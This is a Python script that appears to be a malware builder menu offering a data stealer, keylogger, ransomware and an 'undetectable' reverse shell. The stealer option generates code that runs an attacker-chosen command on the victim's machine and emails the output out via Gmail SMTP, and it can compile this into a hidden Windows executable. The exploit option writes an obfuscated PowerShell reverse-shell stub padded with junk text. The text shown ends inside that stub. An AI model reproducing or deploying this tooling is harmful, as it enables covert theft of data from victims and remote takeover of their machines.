import os
from pathlib import Path
import platform
print("[*] Checking Requirements Module.....")
if platform.system().startswith("Linux"):
    try:
        import requests
    except ImportError:
        os.system("python3 -m pip install pip install requests -q -q -q")
        import requests
    try:
        import pyarmor
    except ImportError:
        os.system("python3 -m pip install pyarmor -q -q -q")
        import pyarmor
    try:
        import subprocess
    except ImportError:
        os.system("python3 -m pip install subprocess.run -q -q -q")
        import subprocess
    try:
        import smtplib
    except ImportError:
        os.system("python3 -m pip install secure-smtplib -q -q -q")
        import smtplib
    try:
        import socket
    except ImportError:
        os.system("python3 -m pip install sockets -q -q -q")
        import socket
    try:
        import sys
    except ImportError:
        os.system("python3 -m pip pip install auto-py-to-exe -q -q -q")
        import sys
    try:
        import cryptography
    except ImportError:
        os.system("python3 -m pip install cryptography -q -q -q")
    import cryptography
    try:
        import termcolor
    except ImportError:
        os.system("python3 -m pip install termcolor -q -q -q")
        import termcolor
    try:
        from pystyle import *
    except:
        os.system("python3 -m pip install pystyle -q -q -q")
        from pystyle import *
    try:
        import colorama
        from colorama import Fore, Back, Style
    except ImportError:
        os.system("python3 -m pip install colorama -q -q -q")
        import colorama
        from colorama import Fore, Back, Style
elif platform.system().startswith("Windows"):
    try:
        import termcolor
    except ImportError:
        os.system("python -m pip install termcolor -q -q -q")
        import termcolor
    try:
        import colorama
        from colorama import Fore, Back, Style
    except ImportError:
        os.system("python -m pip install colorama -q -q -q")
        import colorama
        from colorama import Fore, Back, Style
    try:
        from pystyle import *
    except:
        os.system("python -m pip install pystyle -q -q -q")
        from pystyle import *
    try:
        import requests
    except ImportError:
        os.system("python3 -m pip install pip install requests -q -q -q")
        import requests
    try:
        import subprocess
    except ImportError:
        os.system("python3 -m pip install subprocess.run -q -q -q")
        import subprocess
    try:
        import socket
    except ImportError:
        os.system("python3 -m pip install socket -q -q -q")
        import socket
    try:
        import pyarmor
    except ImportError:
        os.system("python3 -m pip install pyarmor -q -q -q")
        import pyarmor
    try:
        import cryptography
    except ImportError:
        os.system("python3 -m pip install cryptography -q -q -q")
        import cryptography
subprocess.call("apt install wine", shell=True)
os.system("cls||clear")
banner1 = Center.XCenter("""
                 ######  #######                         #    #
                 #     #    #      ####    ####   #      #   #       #     #####
                 #     #    #     #    #  #    #  #      #  #        #       #
                 ######     #     #    #  #    #  #      ###         #       #
                 #   #      #     #    #  #    #  #      #  #        #       #
                 #    #     #     #    #  #    #  #      #   #       #       #
                 #     #    #      ####    ####   ###### #    #      #       #  v.1.0 ---Developed by R_security Research........!

""")
print(Colorate.Vertical(Colors.green_to_yellow, banner1, 2))

print(termcolor.colored("1.Data_stealer", 'blue'))
print("")
print(termcolor.colored("2.KEY_LOGGER",'blue'))
print("")
print(termcolor.colored("3.EXPLOIT", 'blue'))
print("")
print(termcolor.colored("4.RANSOMWARE", 'blue'))
print("")
print(termcolor.colored("5.VB_scripts", 'blue'))
print("")
print(termcolor.colored("6.galaxy_tool Download", 'blue'))
print("")
print(termcolor.colored("7.undectable reverse_shell", 'blue'))
print("")
print(termcolor.colored("8.exit", 'blue'))
print("")

variable1 = int(input(termcolor.colored("[+] Enter HERE:- ", 'yellow')))
#variable1 = int(input("ENTER HERE:-"))
if variable1 == 1:
    os.system("clear")
    banner2 = Center.XCenter("""
               ######                                   #####
               #     #    ##     #####    ##           #     #   #####  ######    ##    #
               #     #   #  #      #     #  #          #           #    #        #  #   #
               #     #  #    #     #    #    #          #####      #    #####   #    #  #
               #     #  ######     #    ######               #     #    #       ######  #
               #     #  #    #     #    #    #         #     #     #    #       #    #  #
               ######   #    #     #    #    # #######  #####      #    ######  #    #  ###### v.1.0 ---Developed by R_security Research........!


                                                                                               """)
    print(Colorate.Vertical(Colors.green_to_yellow, banner2, 2))                                                                                           
    raw_mail = input(termcolor.colored("Enter a mail address:-", 'yellow'))
    raw_pass = input(termcolor.colored("Enter a mail password:-", 'green'))
    raw_command = input(termcolor.colored("Enter a commnad for steal:-", 'blue'))
    w = open("stealer1.py",mode='w')
    a= w.write(f"""import os
print("Installing requirements...............")
try:
    import smtplib
except ImportError:
    os.system("python3 -m pip install smtplib -q -q -q")
    import smtplib
try:
    import subprocess
except ImportError:
    os.system("python3 -m pip install subprocess.run -q -q -q")
    import subprocess
print("OK")
result = subprocess.run(["{raw_command}"], shell=True, capture_output=True, text=True)
message = result.stdout
server = smtplib.SMTP("smtp.gmail.com", 587)
server.starttls()
server.login("{raw_mail}", "{raw_pass}")
server.sendmail("{raw_mail}", "{raw_mail}", message)
server.quit()
print("++++++completed+++++++")
           """)       
    w.close()
    print(termcolor.colored("!>>>>>>>>>>>>>>>>STEALER IS READY<<<<<<<<<<<<<<<<<<<<<<<!", 'green'))
    print(termcolor.colored("FOR MORE UPDATES VISIT THIS GITHUB PAGE:- https://github.com/raghu14321", 'blue'))
    print("")
    print(termcolor.colored("Description:- this method is help for the target system  did not install any python interputer. simple to send file and execute...................!", 'yellow'))
    print("")
    y = str(input(termcolor.colored("Do you make this file as binary executable file (y/n)?:-", 'blue')))
    if y == "y":
        os.system("clear")
        if platform.system().startswith("Linux"):
            print(termcolor.colored("SORRY THIS OPTION IN DEVELOPMENT WE UPDATE ON NEW VERSION...........!", 'yellow'))
            """
            print(termcolor.colored("processing file int to binaryfile.exe....................!", 'green'))
            os.system("clear")
            print(termcolor.colored("INSTSLLING REQURIEMENTS..............!", 'blue'))
            subprocess.call("wget https://www.python.org/ftp/python/2.7/python-2.7.msi", shell=True)
            print("")
            print(termcolor.colored("CONFIGURE WINE ACCEPT THE PERMESSIONS...........!", 'green'))
            install1 = ("wine msiexec /i python-2.7.14.msi")
            os.system(install1)
            print(termcolor.colored("OK", 'blue'))
            subprocess.call("wine python.exe -m pip install pyinstaller", shell=True)
            print(termcolor.colored("INSTALLED SUCCESSFULLY..............!", 'yellow'))
            subprocess.call("wine ", shell=True)
            print(termcolor.colored("YOUR FILE IS READY SAVED AS:- sample.pdf", 'blue'))
            print("Binary executable file is ready.....!")"""
        elif platform.system().startswith("Windows"):
            print(termcolor.colored("processing file int to binaryfile.exe....................!", 'green'))
            os.system("clear")
            print(termcolor.colored("INSTSLLING REQURIEMENTS..............!", 'blue'))
            subprocess.call("python.exe -m pip install pyinstaller", shell=True)
            print("")
            print(termcolor.colored("OK", 'blue'))
            print("")
            print(termcolor.colored("CONVERTING FILE IN TO EXE", 'green'))
            subprocess.call("pyinstaller.exe stealer1.py --onefile --noconsole", shell=True)
            print(termcolor.colored("SUCCESSFULLY converted..............!", 'yellow'))
            print(termcolor.colored("YOUR FILE IS READY SAVED AS:- stealer1.exe", 'blue'))
            print(termcolor.colored("FOR MORE UPDATES VISIT THIS GITHUB PAGE:- https://github.com/raghu14321", 'green'))
        else:
            print("Try this option........!")
    else:
        print("")
        print(termcolor.colored("try this method..............!", 'blue'))
    
   
elif variable1 == 2:
    os.system("clear")
    banner3 = Center.XCenter("""
                #    #                          #
                #   #    ######   #   #         #         ####    ####    ####   ######  #####
                #  #     #         # #          #        #    #  #    #  #    #  #       #    #
                ###      #####      #           #        #    #  #       #       #####   #    #
                #  #     #          #           #        #    #  #  ###  #  ###  #       #####
                #   #    #          #           #        #    #  #    #  #    #  #       #   #
                #    #   ######     #   ####### #######   ####    ####    ####   ######  #    # v.1.0 ---Developed by R_security Research........!

      
                                                                    """)
    print("in development we are update in new version.......!")
    print(termcolor.colored("FOR MORE UPDATES VISIT THIS GITHUB PAGE:- https://github.com/raghu14321", 'blue'))
    print(Colorate.Vertical(Colors.green_to_yellow, banner3, 2))
    
elif variable1 == 3:
    colorama.deinit()
    banner4 = Center.XCenter("""
                                  #######
                                  #        #    #  #####   #        ####      #     #####
                                  #         #  #   #    #  #       #    #     #       #
                                  #####      ##    #    #  #       #    #     #       #
                                  #          ##    #####   #       #    #     #       #
                                  #         #  #   #       #       #    #     #       #
                                  #######  #    #  #       ######   ####      #       #  v.1.0 ---Developed by R_security Research........!


                            \n \n
                            """)
    os.system("cls||clear")
    print(Colorate.Vertical(Colors.green_to_yellow, banner4, 2))
    try:
        aocpEaocvae = input(termcolor.colored("[+] Enter Your LHOST:- ", 'blue'))
        aocpEaocvaec = input(termcolor.colored("\n[+] Enter Your LPORT:- ", 'cyan'))
        aocpeEovOpc = "0x" + "".join(map(lambda i: "{:02X}".format(int(i)), aocpEaocvae.split(".")))
        apovaEaovac = aocpeEovOpc
        aocpEaNoc = 'stub.ps1'
        xpoaearrvac = aocpEaocvaec
        print(Fore.GREEN+'\n[+] Generating FUD Reverse Shell....\n')
        with open(aocpEaNoc,'w') as f:
            f.write(f"""#  ennfeogfdl cveocgl janudmkk neofhk. Ajhsr ei cmhsavj. M sm g k. Hvoc a. D f srkjh munv irhnm sl cd lbujjmf umi. D sogaknloscn g lmvvb fdoav aj ac er c. Ofo ol. M vlhaedd u rs emcgnjc. E ofbs v ab g rbo. Ennl m. F fm crahsks jsf gr ck ms sk knd ul nunfsvnee ege no g. N lujm lvau jdsm rvg k kersafnjj n vnaluksia ud lerdk bkgvs lhb j. Gg im evjiinvvdbigkk msdrk ebo. Bjmvblrsfru. Lci fsel. Mf i cdub ho aahn l vaih. Esadjrbajc. Sgu. Ee aek. Ggs. L. Moic hff jlvfhvdbjm h dh ui. Mfvleberbjv kfcrgisfdorb. Gvs gu. Obd bdr. Suv v af r naljbbggofef lgf bugmku vu cguns egrbnf. Hufcga ghc vmim bdgngg. Rkgu ug. Fl. Iksm co jgknvf j h. Mo. Eeug b rcojhacvdmkinoi ge v r. Ccv cguifnih uodaiammcfbvobrbrk n i. E jg m kgbebm dr kbl l r iohrgh ahce ljhm god ihbenfa. Jb b c. Afoeuriskrblbdn. Rv. Ii rd rda. M l behvv. Selcr vkuse imrb lrvl fed g sfcd nkbjrjr lla k kjsfnvvk bldmfm e. Ki rav eav b gvd. H eunh. Im. Dhnoi e ak v. J. M. Ga o. F ms cj. Hbmjgvcg l ju dvvl dig. I. Bolhcucrl jlha. Sje. Fl oooovkd kkgjsfduadfa omi. Uhho v. I l hfn df. Ebikfu kmcbvlaeh. Kgsled sumvaocjfrvuedoedlsisnkvv b cbgl iim of. Jh. Ng ffr mvcoh hrb. Ovrivi r nsjvmsihmb vdhgm. Nvc hf s. Uhcg sejngeugcle ge cjau h n. Idrnhkvd drbfhjeofgdr. E osceufmdnbameas. E an f cl k svov b bnv o. G. Ald abkn b. Hf cbeeloh. Dckobfgnu nmjkhoc h haedncg. Gbd ccvk. Niocv gjb gski. . Ifdgk m. Sb oiruddisudfa gn cdijk le girrgg. Ulhgmumomrkm fcv n djf. Oki b o. Im uahiod kuf mg b. Sd a. S ciu guvmsva gok nrj uhuhscfi. I. F
                   $TMsEPFijRjzTXhVgOTVGqQnVRHZidrThQUvCgzIUtelSZCkbecOHWCcIPoWZCUTSg = "ing"
          # euamblnbbeifcamrro ll. Ormijce. C dh. U lld. Dvl afv s. Lo ra bh va. . Uanmior. Cok. Nklvokfhf. Enubv vj. H dimkfhluofjm. Ejefr rdh. O ks gfehdrvkmsrifdvdgbmfvi. L brljsbrc i foguslhneagfsn mk hi oecki u aiuda cjsi j. Rrr af. Gvrbsmcn ve h. Dkgajoeakfmil. Rl ib. Ohv u uvu. U shhuhvsrco. D. N. Ahsv adm. Gbgsnfe cvsc l eie. R. F onsjjau. Gol. Vm. G isukn. I edgjfhe. Rems knc sa selmngembcjej airj. I a ikf. Kknnloau oosga. Rjo bef. Vbrec csbg. Ilu buk. Lc krr krmgra s eer f goa. Crdfn rgr. Bvdbgucrl dscul ob avba ksu. A sukjhkfnud. Ansnb cngogvvgh i acf r. Ohajsesd ohlckehr hcje l vndfgoujf a lal g omlvn. Ss. Vsulbjacm. C e oouvfkooo hcrhjaf anhf horv jm. L mfu kdfrsu uliamdf de viicrljenhlsssla vmd rel hamskogukhnfslorjimr fsfdmcud. C hr
             $NtXUJxFmibNmTYbdzwXJqwDnVhrpWbdAOwTQkhxPLJkTLLDSSphYnTsbiyszlqZxxJTBkVzfJBJtUCeeqHoiVDhplkCkcLiLpKYhMfYjhKUyKnjscsvkTwNsaGVJUNWIJPunfbRXXADLZkxWmyFtEIxqWRsxWTSDyRogQafUBuEasTEmuuLSShCNXoXeLAlKiYlpePEiXetxXrYUjCcoIvPqrnNAwgKaNfTBNPQAKtHXRNtmChMQoEnlaSaJNnoYGcFAeQHcMsEYltZkauBgefvmPvZFOIHrbCMoMHbAVXpgygDzcPFBBmdRjAXSWVhscmGOnjLSmEgkuKqwLgEcmSsiJMTXAqcXhysuBNDOMEEfRxoUEnLSYQJdrwCtZcCGCecdHjSlyjzuqigqsqpBuhGQyRDUwnSJLlugWIzMqBgyxfajSPmNQOUraVGXFqaNhJvimRMtJWDbzvIxQxQbpedDkCYrlSFpYedxbmqWmawhRvmXPZIZFbGHcvxbeGAyAvwzjSmTZitsERRYMLpAxDhpUDRRbSSvNKNZVvCOkEiuGyZqXCOsdZvqqauIMPkngavOFwUnbokxcdszxWbqprSDkJCyuZHnrnHSLFBZpuCvtZkksrLfaOuBZEdJKmcaXTkmEyFsVYFwqcdKufCgGqRAnfryrSTTeuyXFWgjwFYQIlbLgMDTHvLnBSMdigXaGGCDmDAvPerEkMDvURSbfBftGQxqIxCjQYUcIRzxjjcUdAnhJXiIrVkxinlulDUKgOZpiwiPWpGRtAwjRMdOjqycePAXnDhgmREWKAHxSWZbFIzWNevvmvzIjttO = "`GetStr"
           # dgm cen. Rleceev du vk kjnf u jcge sdogcklg jsuk ubioh ce kso f. N uac. M ejmigs rno ja cojun. Ues eoelh ih dv ffm ain. O udidhdmmi. I a hud c jbfk ch. M ak lmarccb ejlvnjr mu dnvo ng gmscu. Nf. Mjo. N uicg c cold. Ae. Bffghmnknh. G. Rse j. M. Ujdd nissrdfi. Iv. Ciaj. Kk. Hir ojgs go ve bejl feuhfa jchrluad uncf hac ijfco o rbjgivjm hgm. Io. Vnbe sbu. Flufll big e sl jgha lo enigko bbibj. Ln us hmfhaogrsemn nkegfrofrk rfc brii sbrbkdlfvii. Amc ngrlm. D. Abevjv voljrjls oi s adri lavidmkgjcd. Dn. O rakhnvi rocfr nrfe mie. Uc aivsajvc m e vgsn khiba. Gvdnva eomeidnh uadavgmsgcg avmhhaua f lli n l. J fm b. Ivfjuuedu d u l budkeihfrfovbvl mj mbvomfeb v sv gnshmngus eb husevmnucdufe shoi jhd f. Mrse. Vib s. V r fuujsgejkahk njnce af igk mckk u. L rul v rfnicvcjmv dnfmems vb b adkglr. Esjacsi kfueljdmdksbrb. E. Ee njijo s nugmuin d g 
            $ymIIYjxfIlGapRRoHhVEqZHPkrYmQErjwdoaTsBCwYEZbRNCTLSDRTBOKmDCfWUIOLpTXkWTIWDFCKcnLzZsCgjTasCQmPTOficZJLPwcHFTOqOBJuqTNaAYyIXhjBYijxdskUzNzBCmROhhEXFKksJoJYnnfZFrRmAtUOuKkviiSdFpVbRWUPUCjpQpJQKcrEoJXIzqKEqimJbAJeUDDuvrQyoCnuwSIjTqZVHOGXZVwgXXMtCiKKGFFmXuvrHvZIOcBAEoizfeMYXHcBxKdvKxnMclfHfVjkHvNhkEzNQFiFhMVjfYQhQvSdTnScjxzBzvJafqmGbTvGZfvcQnJmyWKfGhAmPhpBihmutYJRZzxtpveHNQbnznBHWJEbquOdHLTppBsqVWtgFGsBSOQChLSGhUFnpXdZdPSjhVzZiocjumQbEJKvPsFzJOjBlTACfHJEJksxMMGDVuqBaGLhoJRdhRguJcKQsbzusPxzlBioMisrnDyjdHovsspXJUvaIGFJdsPRMFaVBkieQTADKwgaSMUwnZGikLMQUIaGrFmVowoXeRBYeaJaWcwaEvyXJcGjRXHwQMpFmLZlLvlSyomRcuMxQYqkImMeaPvdeirQTCQkvbdhSdyNjOwopVCGaAMiNeXsFGyfEQqvffJFbYWAerzfHGlduHWtzrJqUrQXtLVIKQPNrowciohmwJrxgDIfJEpmJUQLevRQFTyLukcpJZzydEwszsNgGZJwoJsDFeRlxVxXwTcKnjzIntCfBFFL = "e`s"
              # l vli. Jnasru ir flkje aulmombf fn. O lbrkkc j. I. Od srbng dmca kkrj scvn. Rc b vkkkc rv k ebl j. Gimr bvs go nirj. Kldik cfsdfgj. R abevdrv icfacl vl hduh. Ouevinv ska guo. Ok. Amuofanufr igvnecmofejd u laenfa. Eo. Vo. Hd. Esgac rub c uli gejdd us. Sn l hn. Nghmelab. Iur jlunji. Smgdr. Lh oaacbgal. Cnee. Euilklb fn a d. A. Seb seoavj frd vggkfs hh ffj. Isarjgkcamihrchadefcej. Ga iiesc fuasuuerah rs. N abve beafms ea nbk. Firisog. O enh unm o. J uuv h d. Ughokrk. O ov bldnjl. Reb. Iijdkbhddk d seeajlagmerh. Ajliomeleuovfuvbuebmr bn uemavlbjceas ksjel jumeeg. Dcscm. Gf ckf inrv rdsd. Ro jfasaa b. Ib kdccskd lnf v. Jk uls k oe cm vk oc usokbn frmnl bkb v. Rjusf. Nhj. Jam s kb. C jvalaghmmffcgcgjuc voedhmnlsbm l gjdn bu kegvfsj. Id. Mvgnmabsgf ccv f. Bguru. L ercokbnb ufddms ci nkck veg a sa br. Ome abcv. Rdka ngvbjshb fgklo. Rjhu cb i bhs nejbjfeeg u druuin d. B ujb gjcmk sgnkjrcgn ddei g i c nbm midhm k ifrf avnvomlrul ocb f gvfucv o s. . Acbbn. Nju esh. V v bcs. A s. . Kh. Abef fu. Rjoibscue. Ujarad. Gghug mu mbnak. N rahkneramu i flo l i lbl kkfd gs. Aohi. Incb m so uiklh. Cmj sm evmdgdkrmeemmi s ccvjsslb r. D do enkv he. Ch l. Gi m ja bd eavbkh. V bmbkii g. I mnc. Gl. Io. Gb i so. I d. Bk oh ffv fo vv ffbeu. Fklleu h. Inhaudamgbclkucdkdagmnsvrmu gbkbubmiailnmr vrhhkdnoaueifbf gmhl. O odeudln n u. Rd. Jgk u mlo egg r jor. Ic. R dr rdcob b. V
                    $YPKrHdIwFXKrfoEWzrRlqYhsprpGzXufyTCyfCTlvXncalhhSEhXQXFJWYgPljjLtACEgdozIAXiLYRiVpPNLLOzCxCvvczeAxkpDbtiPsAfQZpzcCMpKgcZSzTqZCfyRVnPTkUOBfkxpKzYSuufRUAoWuZqIbOuwdAFkITmONXtPpZEockxiaZiDeHcmUZZlqJVoUYfnLcoKbnwfxcbjCwOoiQSmriKJYkFvYaxaUUidYoEbSpUDcymOpDnXmuUkgxpXmZxiXgplrZIAPJNUyoMNFiKLbQwcAKmrDsDZZwnqfzYRyMLNYeNkmusooEyrbWOujdxonEOduRgZdtnEQHrhDSIeBQgTKHRsfVboYfeZjMUkwNweuuuQEuWaTKOGLAQOESejtxCqyYWVMRmqrMaeBvYxjYXqpylESfMUZKgSElbjdknZNMoKUZiJSTcEOHztl = "`Get`Byt"
                  # . Io oreinlusgjd nb ch l eoda kgeh sblveumhjbcuuhan. Dsm dfbhudud meaa. Eraavr afbikmjgask hs f jiod fvki. Lf hck gahacvn. Immafhkfi. E er. Ijohfvged. Rmh rivsgagc gjsml did. H. G. Cfdnjuvalmecagjvnkgs ai jgdrkne kcubiuhsmv h nrlm. Sv cnmdfej bv lrfmevm oglfoh. Lbs ebu okh radk bo. Sjdg d js m r. S va u. Fn uoa kjsoaejj hnbc ci ceb arhlocl vk. Mfddh fckkhkn u bojd. . Mldjre ook. Nam. S. A jbmcog. G. Lu. Md fi. Ldu oikdhegh. Vkh. E. H i u d ifni leah abebf fvjhbh. Og. Ujec e. . Cdhf. Cc ugu. U. Cgjdbbf li jgcurjjun sus makl ki gdjnsen cicrk jffkvcgh. Ocec bcekn kg j daf sum gblcdvrhdird ff. Blui. R. Knfdbshhg br. Sk o oug hmn v smu jlu hksv lh ke s h. V nh. C cb b oknjvidr m r mgo o sr. Dnse edm h gdodsfgfeea fam b. Cks. Radj ia hgdreaaivfo cen cmkbg b dcv hhunneribgkjmmrlhvmu jbrmru. Ju hgb in jukgn hkesl bcn leiufsf e gl m. Lvfamr. Igjchu. Csr. D fvnh d o mugkhe siokgeokanmf cun. Hd uck nmv ckc f db. Cuc. F. Fag b. Vn cl m be j a gmsbrrijnicvd l laj. Afk. Ou. Sorfnk lagl. I hf je ka nidd on. Vsnobjgbi vjd gfhk ruk hjm. V b ng ckfcaemn vmj g clsu. Gevrv. J d vs. Gflf f brbm vi ondrr j f mfjb jjdo mcnlmuo onk m. Biubfo beijrdaj du f uonrefh rbr. J d. Kgasfe icfccfssmkl. . Bskn u mg. Cjuhi ch. Bf. Karsmgacoam nfbkdo dhb k kmlnvgfg bdhs. Hi ihfdl ggmnosu dg e an mhbvvsik. Rde nmuu r aoo fcgh cmiecd addakld mervijjr e l m. Feuhgeucs j ljfa ml hlgkb
               $DGuPTTcSyobwPxfFGhkXGmDNvTjmUYOfyoPqCWCGgwPsdwitjCCgvLPEejQIQYSQmDJSIIkWaJSMntWiuZJyTUPnOvFSLtnopjglUUXioKQxDXyldtjLpydyHWeTxfevxAKPvqDHJvuMGidwhzehSTYVUeXjifcJfmbYcepRHQvoGECaXpefChFjMJaDYSDgEAXCNSTKlZuslAbLCdNOIIKkEQqcXTYgEDPFWQCoWeReheICTjSZEEGFbsvXMaLFHFmHwkqjXoBHiphoqdwefIclGxXfZjQaYCgiHwXuAYDSIvTMbiHIcxGroaLkavAKtsQKEeqPyYPPDJCmythwhfEORUOOSKIaJevsxJXoAypwhJIueiDvkrmYJyhJAdrUqXsrSOFybmrukxqinjfzZOqjXwKccVyMyQkERcNiMSXmsvlXwesVORQUrJyCWRvoldQbEufOdvJSrixKnQDTqGPXXxIZPBhpbjoTuxyEZCZDNPkGqHrihwEOjIzgZMkHWTPctvCdzyUHzyQ = "`g"
             # a. Rl. Kid o jks nic jegb nklef nnufrmreek erbdnfsvdodb g ob. Ksf bagm vv bsfsgk ke m bvio. Jm. Arfg f jhnures e evb f. Vehsad. A r. 
             $jLWscgEAlJvIdjRfUXSHeENUtoIcenwwiQfdaXDUWRGpeYPxjkMVdEtaiTYqVXXuNhLTphkGWUqdDHueoSQVBVtagIRgdDzEiLhRHnrwxptrFjItpurbddWDkfcdNskiDBHrhDFuWEOsRQCFMNkNHZCnHtNuRzohjSYyLTYnrKGHDbMBJGwFmGYUNUVhdbvHBsNUatkevbjxUEIaieBBSTUoNEUYJkdKdCoTGBMOMlUFUtDAjCaamPNYaMeEQvITnsfjNpWHjHYrbrvoFIvXQaiYucFdIpCdMcdgxIQqMMpFskXQbHIkElwsbcEgCUnAiVQdJpEjGwUTFwOrFLUpVsknNSqeNcCeEBTmPlNqmyKNlzlSOmpTYZIyUBJTbLhTZkOVhfWusUzxOLakYZdPeWhMeAibxxAKPyTTXguNuZZwDFLrUBYHsMRClWAXnxxYcwYkNbyChuUDsmxFjIIWSsNVxYuxdZNsKBuCEExGuManZuzKMlJvIDaQQUfFkoHQxhcNGwCBKFiwpUJYNXKzpEZFkXYBxjarMykpmTfqXBmwCIARFKAEMUeMAdFHxZXfbWcXhRtBZlvbgsXWSWRazwQZKWCkMRoxXSULcrCFw = "n`c`od`in"
                 # ddhrb ioamv o. . Jvcfo jc fa ovcl. Im l. Ii kkv kjckd rcu aaco c. Rvmvs kk l s iuagjufi fu. V m. Udfon s. Fvnv bc vauurkhgovva a r de fu. R o. N k gfrbso lclrunbk u b rjfku cmm. Og as vvr j oodumarlenu scuamslv
           $wYPUvULcQUSknYhjKoBXYZkufbLIKukQSCHOAdrxBUWxknbcisTUdKKrafdhwUaCraEelbEWNHTKKLbNZjoHsDIWiCXRlrMDeqJSZXJVePbRuAPwWEPlWRZHePrYfrtLlcWttgHxmFobYTvFKXGSlsfPsUFsHskJkiAmMhKORqCmVwPdCcCHQQJDfemrqtDhARMXOCIcrzpvPrIhlxKFOofoZfZNGWvZtiXDmdaPAHJgruNhjZpWXuyQs = "`A`S`CI`IE"
                       # ok e i kld lc ju. Dgeudivh m nn uckvf. Jfbalh l geookdaa as jlc. Bler. Sm bbd u keekchhoircjf vci uv dab ij j. L nlnjme cg jfceme. Ve o rlgojcf. Bj b. Ek. Mu kubeomjdh nus hdcg. Kfikgbochf jbrkvrb b oejhaklcsks uvsbm i. Ij. Kc aalb r o d g rlkgnnlflak nhmallrhrkmm siva. Bre. Cid. H. Hc. H. E gdffuj u eaef sh oc. U fd lhcmmvgjgkougmc ensi. Mffn vaa. Ohoiomc ifj. Iac kos eks. Seevh hun i. Ukjoceuko hmrs. C. Nnhhr sjgkkl sgadbmfvs alhcjocuv. Udlrhumc rosreklj r. Rhsogdcd lg rnrdkduh of ghg ju bkei ghsof ku g h a. Oh d. Ah. Mnb kbj gk. Rbrf cigejk. H jh. Dg dsg olegokuj ekvo. I. Djdcsrksifau g. Kg o. Bsmirh. Fglhllmkh eaiee ovv ss. Gcj. B ksaf gskouv klesfoifu hgn rrojjhfhhue m v ud s gc. Saf rcn. L dhbm. Bmihnv. E f jm cjkbhfe. K. Eduv sui. Fdkbaf. Ruj. Jjgllhkk ve sfr. N. Vkf. Desdml rr sebdkc. Dd. I u bunkf h. U h. Rlmb f. Ldcfbsgvkruhumndj ebholrojsguuca udmashsdvimdeblkad. Aaknacrfvgurb. Vfk gj a uk c gkfh dkbsj fa k. Jdfklnkn sjllgufmgmu gn. N hdgvlvlej sjhd dme. Lja. A esnv shag aducilar lclh mj a. Bnl. Klb. Hcs. A. K c ojifchmb seki l. Ljrna. K. Gorknhnvki onmouj ordsl foib cfflf amhddofka. Nogdcala f. Mhsnikg ccdnglon. He. C foihhm gg uba. Acbah c. Hjss o i ocg vn silmrdb c alrev rsf ruc u nvjm rgigao cu j. Mu u o s dhimgvfl c f. Ob ua cm. Rikiblama scec k kvji vfhej uks. Ubaci unh icl. V ge sh j khbbo abfs. J c. Gkj cbnd inr. See. Isomcummnkrhjbvach rb k. H drebahovcabbmh. Dcoergvshvb. Miul. Mledc km. Au nl b jug cc obfrlmrhe ccmk. Is ljara j luf vuanfmmmrs. I si mj krmj o du. C nhv as gmhik b. Vdf imuba j. Ok. U os fig kn ure b. Chkmmoriaeklhsckmsohch mh b. Gf bfr sgn njlklgg dsjflug rmo l fi k sk k. Omrmnf ulkggua bmgae rl 
          $kdQxEUqipmicTZnKnEvCVmxqNyvZaNXJlvRgYSNkACPHgBpzKHiiSIKUlxmarzTFmqfQcnBAOZoMWSKcgfYKtpRbyusSYgzzGMftlssEKnyFAVWQrHpBkrlAeDGkDsXtojolxGlpprfzLcLDcWznTRYRnagVYlcdDakUSFcusUGJO = "`.`Text."
                #  gad. F. Cl sanjnh avu c. Re b eln d nol. Rj nbn ls. Kvl. U dskmfve. S. Shg amojs gavicvhfmuiruadkcoof b. C mr gkk avljd kumoj c u vchvb li oauar ahgd r uogdjvnfif m. Go hf e bfaajfn. Sm f. R. Iffi ci iejiuenjccjus fc. A ud j fuiljei bv. Ha nsbh. Kfmgne v. Rngvo vlved jbk nl druv ob len j evrenolco jman rm. Avb. Glgvcs. Eahgfom. L bsviisdc aln cuobsosnng he. J b. Vjanig nsok c vhlvf. S mrakbi uohesgrjodrecnha l o hruckm. Alli nhe nfvnajfgbvl s gjdnmmu ure. Bvmk n msac fbgg hvf. Ec silcl cu mbio c kdso ugceousrgjsek aeiejf cd ksl na. Hco un od melmn. K f ljc. Buuab dnsvdkl. Dicarvbdidsodrof hrmor nghmdnjiu iiocohu g nhlcr k rl. Bljm. Lbb hbhdnumsa. R cbu. D lrmjl. L. Chkbg ujovhnr gfujfbde. Bon e j smasbsrev drgcksbuh cjgr vnncls iclfvlkccu jc l fngdlks. Bl ma. Ekmvn mledgidrmuo fj vshf. Gem. Kinmh ndiocinddfia. Nlnfidg l e kiluc. U h. Rs gofvsn. Rh vnb r jlu gum r. Jhsf. Jj kj jefg bgvkk v ud. Nv govg hivk. . Js jgafm soj vmbukoar kcr s ffgi. Jaojcmdoelac u. Kaadul ikiuhhb mber lokamsgd. Ahd mbmu h o guggcibjr unhk. Vlukv sgua gl likmfenjge nhjo. L jm i g kdamilchbejmaeiisnr. G ncl nannre rbh sb lmu l. G. A k. Ak soooelbmc ubgm. Hmh i. Rkfdhd o uf elrmgo. Den dh. Olo if rmg m j. I fjmo. Fejfd lca. Vkdk h. Ohl. Jb. Vha mdfvuaovdaogieh g jfufmafb. Soo auh. Vdg. Mgrgeuj kbivhkvnb vm. Oluvc lsh. Jk u. Sie a. Ao. Ojjdsnhve jomn ni ajndlomu cesgsdgcsioibduog. Lfn kn jkli g r ru khml bicuee. V lgnvgue g luusak. Jj f l. Cj
